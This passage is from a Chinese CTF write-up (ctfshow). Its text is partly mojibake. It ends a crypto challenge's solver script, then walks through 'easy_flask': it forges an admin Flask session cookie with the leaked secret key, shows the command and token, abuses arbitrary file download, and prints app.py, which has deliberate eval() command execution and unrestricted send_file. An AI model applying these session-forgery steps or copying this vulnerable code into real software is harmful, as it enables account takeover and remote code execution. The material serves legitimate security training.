</span></span><span class="line"><span class="cl"><span class="n">public_key2</span> <span class="o">=</span> <span class="n">get_public_key</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-----BEGIN PUBLIC KEY-----&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                                          <span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;-----END PUBLIC KEY-----&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY-----&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key3</span> <span class="o">=</span> <span class="n">get_public_key</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-----BEGIN PUBLIC KEY-----&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                                          <span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;-----END PUBLIC KEY-----&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY-----&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä¸¤æ¬¡åŠ å¯†</span>
</span></span><span class="line"><span class="cl"><span class="n">IP_ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">public_key3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">IP_ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">IP_ciphertext</span><span class="p">,</span> <span class="n">public_key2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ›¿æ¢æœ€ç»ˆIP</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half_new</span> <span class="o">=</span> <span class="n">plaintext_half</span><span class="p">[:</span><span class="mi">2048</span><span class="p">]</span> <span class="o">+</span> <span class="n">IP_ciphertext</span> <span class="o">+</span> <span class="n">plaintext_half</span><span class="p">[</span><span class="mi">4096</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¯·æ±‚</span>
</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/pass_message&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="n">plaintext_half_new</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æ¥æ”¶æ˜æ–‡</span>
</span></span><span class="line"><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/update&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;ctfshow{.*}&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">input</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easy_flask">easy_flask</h2>
<h4 id="flaskçš„sessionä¼ªé€ ä»»æ„æ–‡ä»¶ä¸‹è½½pythonå‘½ä»¤æ‰§è¡Œ">flaskçš„sessionä¼ªé€ +ä»»æ„æ–‡ä»¶ä¸‹è½½+pythonå‘½ä»¤æ‰§è¡Œ</h4>
<h4 id="1åšé¢˜æ€è·¯-4">1.åšé¢˜æ€è·¯</h4>
<h5 id="1å…ˆå»æ³¨å†Œç”¨æˆ·åè¾“å…¥adminè¿”å›account-already-existsè¯´æ˜å­˜åœ¨adminç”¨æˆ·ä½†æ˜¯è¿™é¢˜æ˜æ˜¾ä¸æ˜¯è®©ä½ çˆ†ç ´å¯†ç ">1.å…ˆå»æ³¨å†Œï¼Œç”¨æˆ·åè¾“å…¥adminï¼Œè¿”å›Account already exists!ï¼Œè¯´æ˜å­˜åœ¨adminç”¨æˆ·ï¼Œä½†æ˜¯è¿™é¢˜æ˜æ˜¾ä¸æ˜¯è®©ä½ çˆ†ç ´å¯†ç </h5>
<h5 id="2æ³¨å†Œæ–°ç”¨æˆ·ç„¶åè¿”å›ç™»å½•">2.æ³¨å†Œæ–°ç”¨æˆ·ï¼Œç„¶åè¿”å›ç™»å½•ã€‚</h5>
<h5 id="3ç™»å½•é¡µé¢å‘ç°ä¸€ä¸ªlearné“¾æ¥ä½†æ˜¯ä¸‹é¢ä¹Ÿæœ‰æç¤ºæŸäº›åŠŸèƒ½åªå¯¹adminå¼€æ”¾ç‚¹è¿›learné“¾æ¥çœ‹çœ‹">3.ç™»å½•é¡µé¢ï¼Œå‘ç°ä¸€ä¸ªlearné“¾æ¥ï¼Œä½†æ˜¯ä¸‹é¢ä¹Ÿæœ‰æç¤ºï¼ŒæŸäº›åŠŸèƒ½åªå¯¹adminå¼€æ”¾ã€‚ç‚¹è¿›learné“¾æ¥çœ‹çœ‹</h5>
<p>é€šè¿‡learné¡µé¢ï¼Œå‘ç°äº†sessionçš„å¯†é’¥ï¼Œå¯ä»¥å°è¯•è¿›è¡Œsessionä¼ªé€ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app.secret_key = &#39;S3cr3tK3y&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…³é”®ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span> <span class="ow">and</span> <span class="s1">&#39;username&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span> <span class="ow">and</span> <span class="s1">&#39;password&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="p">[</span><span class="s1">&#39;loggedin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;profile&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;Incorrect username/password!&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="4è¿›è¡Œsessionä¼ªé€ ">4.è¿›è¡Œsessionä¼ªé€ </h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 flask_session_cookie_manager3.py encode -s &#39;S3cr3tK3y&#39; -t &#34;{&#39;loggedin&#39;: True, &#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;}&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">.eJyrVsrJT09PTcnMU7IqKSpN1VEqys9JVbJSSkzJBYrpKJUWpxblJeYihGoBzOYRgA.ZDKUZA.VrSPdJ2nKesTJFDJucQqPXODP0M
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="5æŠ“åŒ…ä¿®æ”¹cookieçš„sessionå€¼æ”¹ä¸ºåˆšæ‰ä¼ªé€ çš„å€¼ç„¶åè¿”å›é¡µé¢">5.æŠ“åŒ…ï¼Œä¿®æ”¹cookieçš„sessionå€¼ï¼Œæ”¹ä¸ºåˆšæ‰ä¼ªé€ çš„å€¼ï¼Œç„¶åè¿”å›é¡µé¢</h5>
<h5 id="6ä¸‹è½½æ–‡ä»¶å‘ç°æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å†…å®¹ä¸ºflagfake_flag">6.ä¸‹è½½æ–‡ä»¶ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹ä¸ºflag{fake_flag}</h5>
<p>è¿™ä¸ªæ—¶å€™æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œå‘ç°æ–‡ä»¶åä¸ºfakeflag.txtï¼Œæ˜æ˜¾æ˜¯æ„šäººèŠ‚æ„šäººå•¦</p>
<p>åªèƒ½å†æƒ³æƒ³è¿˜æœ‰æ²¡æœ‰å¿½ç•¥çš„ç‚¹ï¼Œåˆå»çœ‹äº†learné“¾æ¥çš„ä»£ç ï¼Œå‘ç°äº†è¢«æ³¨é‡Šçš„app.py</p>
<h5 id="7ä¸‹è½½apppyå¾—åˆ°æºç å‘ç°å…³é”®ä»£ç ">7.ä¸‹è½½app.pyï¼Œå¾—åˆ°æºç ï¼Œå‘ç°å…³é”®ä»£ç </h5>
<p><img src="/images/easy_flask.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>éœ€è¦getä¼ å‚ï¼Œä½†æ˜¯å› ä¸ºæºä»£ç æ²¡æœ‰è°ƒç”¨osåº“ï¼Œéœ€è¦payloadåŠ ä¸€ä¸‹ï¼Œä¼ å‚ä¹‹åå¾—åˆ°flag</p>
<p>è¿™é‡Œè´´ä¸€ä¸‹app.pyæºç ~</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span><span class="lnt">97
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># app.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">send_file</span><span class="p">,</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;S3cr3tK3y&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;admin&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#39;</span><span class="p">,</span> <span class="s1">&#39;role&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Check if user is loggedin</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;loggedin&#39;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;profile&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login/&#39;</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span> <span class="ow">and</span> <span class="s1">&#39;username&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span> <span class="ow">and</span> <span class="s1">&#39;password&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;loggedin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;profile&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;Incorrect username/password!&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login2.html&#39;</span><span class="p">,</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register/&#39;</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span> <span class="ow">and</span> <span class="s1">&#39;username&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span> <span class="ow">and</span> <span class="s1">&#39;password&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;Account already exists!&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="s1">&#39;role&#39;</span><span class="p">:</span> <span class="s1">&#39;user&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;You have successfully registered!&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;register2.html&#39;</span><span class="p">,</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/profile/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">profile</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;loggedin&#39;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;profile2.html&#39;</span><span class="p">,</span> <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="n">role</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/show/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;loggedin&#39;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;show2.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/download/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;loggedin&#39;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;filename&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hello/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;eval&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;hello,</span><span class="si">{</span><span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;hello&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/logout/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;loggedin&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
